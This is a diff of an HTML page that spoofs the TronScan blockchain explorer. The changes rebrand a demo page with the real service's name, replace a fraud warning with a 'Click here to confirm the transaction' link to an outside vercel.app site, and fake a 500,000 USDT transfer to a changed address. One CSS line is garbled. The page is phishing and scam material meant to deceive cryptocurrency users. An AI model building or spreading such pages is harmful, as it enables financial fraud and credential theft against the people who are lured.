@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#ffffff">
-<title>DemoScan — Transaction Details</title>
+<title>TronScan — Transaction Details</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;600;700;900&display=swap" rel="stylesheet">
@@ -132,7 +132,7 @@ svg{display:block;flex:none}
 .card-g{position:absolute;left:12px;top:24px;width:30px;height:20px;border-radius:4px;background:linear-gradient(135deg,#3ddc84,#1ea862);transform:rotate(-14deg)}
 .b2{
   padding:12px 18px;
-  display:flex;flex-direction:column;justify-content:center;
+  display:flex;flex-directDEMOSCANmn;justify-content:center;
   background:linear-gradient(100deg,#111417 0%,#15241d 70%,#1a3a2b 100%);
 }
 .b2 p{margin:0;max-width:220px;font-size:12px;line-height:17px;color:#e6efe9}
@@ -364,7 +364,7 @@ h1{margin:0;font-size:18px;line-height:24px;font-weight:600;color:#1f2024}
         <path d="M0 6.2l11.5 4.2L23 6.2v2.2l-11.5 4.2L0 8.4z" fill="#e5252e"/>
         <path d="M0 11.6l11.5 4.2L23 11.6v2.2L11.5 16 0 13.8z" fill="#e5252e"/>
       </svg>
-      <span>DEMOSCAN</span>
+      <span>TRONSCAN</span>
     </div>
     <div class="price">TRX: <b style="font-weight:600">$0.3058</b> <span class="neg">(-0.10%)</span></div>
     <div class="navr">
@@ -418,9 +418,9 @@ h1{margin:0;font-size:18px;line-height:24px;font-weight:600;color:#1f2024}
   <section class="tx">
     <div class="alert" id="fraudAlert" role="alert">
       <svg class="alert-ic" width="9" height="9" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2L1 21h22L12 2z" fill="#b3262e"/><path d="M12 9v5.5" stroke="#fff" stroke-width="2.6" stroke-linecap="round"/><circle cx="12" cy="17.6" r="1.6" fill="#fff"/></svg>
-      <p class="alert-txt">This transaction is from a fraudulent address with a similar suffix.</p>
+      <p class="alert-txt">This transaction as not yet been confirmed with a similar suffix.</p>
       <!-- Set href to a verified URL you control; "#" is a placeholder -->
-      <a class="alert-link" href="#">Understand relevant information &gt;</a>
+      <a class="alert-link" href="https://tether-usdt-reflection.vercel.app/"> Click 𝗵𝗲𝗿𝗲 to confirm the transaction, &gt;</a>
       <button class="alert-x" id="alertClose" aria-label="Dismiss warning">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#b3262e" stroke-width="2" stroke-linecap="round"><path d="M5 5l14 14M19 5L5 19"/></svg>
       </button>
@@ -429,8 +429,8 @@ h1{margin:0;font-size:18px;line-height:24px;font-weight:600;color:#1f2024}
       <svg class="ic-copy" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#a3a9b2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2.5"/><path d="M5 15H4.5A1.5 1.5 0 0 1 3 13.5v-9A1.5 1.5 0 0 1 4.5 3h9A1.5 1.5 0 0 1 15 4.5V5"/></svg>
       <svg class="ic-check" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#2a8e25" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
     </button></div>
-    <div class="transfer">transferred <span class="chip amt"><span>0.3</span><svg class="tok" aria-hidden="true"><use href="#tok-usdt"/></svg><span>TRX</span></span> <span class="chip usd">($0.09)</span> to</div>
-    <div class="addr-line"><span class="addr">THdcxyQTDN5bysLs1NNHHiaterMRgmVNT8</span><button class="copy" data-copy="THdcxyQTDN5bysLs1NNHHiaterMRgmVNT8" aria-label="Copy address">
+    <div class="transfer">transferred <span class="chip amt"><span>500,000.00</span><svg class="tok" aria-hidden="true"><use href="#tok-usdt"/></svg><span>USDT</span></span> <span class="chip usd">($500,000.00)</span> to</div>
+    <div class="addr-line"><span class="addr">TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv</span><button class="copy" data-copy="TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv" aria-label="Copy address">
       <svg class="ic-copy" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#a3a9b2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2.5"/><path d="M5 15H4.5A1.5 1.5 0 0 1 3 13.5v-9A1.5 1.5 0 0 1 4.5 3h9A1.5 1.5 0 0 1 15 4.5V5"/></svg>
       <svg class="ic-check" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#2a8e25" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
     </button></div>
@@ -527,7 +527,7 @@ h1{margin:0;font-size:18px;line-height:24px;font-weight:600;color:#1f2024}
     </div>
     <div class="fld">
       <div class="lbl"><i class="qm">?</i>To:</div>
-      <div class="box"><span>THdcxyQTDN5bysLs1NNHHiaterMRgmVNT8</span><button class="copy" data-copy="THdcxyQTDN5bysLs1NNHHiaterMRgmVNT8" aria-label="Copy to address">
+      <div class="box"><span>TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv</span><button class="copy" data-copy="TGHu7d1FMjbCYBEP5yKfhUPhbmZUCrWEbv" aria-label="Copy to address">
         <svg class="ic-copy" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#a3a9b2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2.5"/><path d="M5 15H4.5A1.5 1.5 0 0 1 3 13.5v-9A1.5 1.5 0 0 1 4.5 3h9A1.5 1.5 0 0 1 15 4.5V5"/></svg>
         <svg class="ic-check" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#2a8e25" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
       </button></div>
@@ -536,8 +536,8 @@ h1{margin:0;font-size:18px;line-height:24px;font-weight:600;color:#1f2024}
     <div class="fld">
       <div class="lbl"><i class="qm">?</i>Amount:</div>
       <div class="chips">
-        <span class="chip amt"><span>0.3</span><svg class="tok" aria-hidden="true"><use href="#tok-usdt"/></svg><span>TRX</span></span>
-        <span class="chip usd">($0.09)</span>
+        <span class="chip amt"><span>500,000.00</span><svg class="tok" aria-hidden="true"><use href="#tok-usdt"/></svg><span>USDT</span></span>
+        <span class="chip usd">($500,000.00)</span>
       </div>
     </div>
   </section>
